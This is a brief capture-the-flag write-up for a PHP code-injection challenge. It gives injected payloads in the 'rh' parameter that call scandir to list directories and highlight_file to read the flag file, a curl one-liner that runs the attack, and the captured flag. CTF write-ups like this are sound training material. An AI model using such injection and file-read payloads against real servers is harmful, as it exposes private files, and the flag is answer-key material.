**Challenge:** http://pwnable.org:19260/?rh=

Listing files: `var_dump(scandir("<Directory>"));`
Getting the flag: `highlight_file("../../../flag.so");`

Run: `curl 'http://pwnable.org:19260/?rh=highlight_file("/flag.so");' | strings | grep flag{`

**Flag**: flag{FFi_1s_qu1T3_DANg1ouS}
